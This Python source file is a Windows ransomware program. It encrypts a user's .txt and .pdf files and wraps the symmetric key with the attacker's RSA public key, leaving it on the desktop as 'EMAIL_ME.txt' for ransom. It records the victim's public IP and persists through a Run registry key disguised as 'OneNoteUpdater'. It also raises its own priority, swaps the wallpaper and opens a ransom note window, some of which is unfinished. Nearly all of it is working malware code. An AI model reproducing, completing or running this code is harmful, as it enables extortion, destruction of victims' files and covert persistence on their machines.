# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import ctypes # so we can interact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to call subprocess
import psutil
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on dekstop
from tkinter import *
import winreg
import sys


class RansomWare:

    # File exstensions to seek out and Encrypt
    file_exts = [
        'txt',
        'pdf'
       # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
       # -and leaves other files un-ecnrypted etc.
       # 'png', 
    ]

    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = r'C:\\Users\\xevep\\Downloads\\ransom' # Debugging/Testing

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get('https://api.ipify.org').text

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key =  Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)

    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}\\Desktop\\EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrpyted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)
        #rename file name
        if not encrypted:
            new_path = file_path + ".encrypt"
        os.rename(file_path, new_path)
        return new_path

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    def already_exists(self, key_path, key_name):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, key_name)
            winreg.CloseKey(key)
            return True
        except WindowsError:
            return False
        
    def set_high_priority(self):
        pid = os.getpid()
        p = psutil.Process(pid)
        p.nice(psutil.HIGH_PRIORITY_CLASS)


    def add_to_startup(self, file_path, key_name="OneNoteUpdater"):  # verrà utilizzato il nome di un programma familiare
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

        path = os.path.expandvars(file_path)
        value = f'{path}\\RansomWare.exe --no-startup-window --win-session-start'
        if not self.already_exists(key_path, key_name):
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
    
    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}\\AppData\\Local\\Temp\\72dks289d9dfd89wf.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def show_ransom_note(self):
        root = Tk()
        root.title("TITOLO DA INSERIRE")
        root.geometry("700x500")
        root.resizable(False, False)

    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print('started') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
                with open(f'{self.sysRoot}\\Desktop\\PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') # Debugging/Testing
                    break
            except Exception as e:
                print(e) # Debugging/Testing
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
            # Would use below code in real life etc... above 10secs is just to "show" concept
            # Sleep ~ 3 mins
            # secs = 60
            # mins = 3
            # time.sleep((mins*secs))

def main():
    path = f'%USERPROFILE%\\Desktop'
    #real path AppData\\Local\\OneDrive\\cache\\qmlcache
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.add_to_startup(path)
    rw.set_high_priority()


    t1 = threading.Thread(target=rw.show_ransom_note)
    #t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    #t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing

if __name__ == '__main__':
    main()
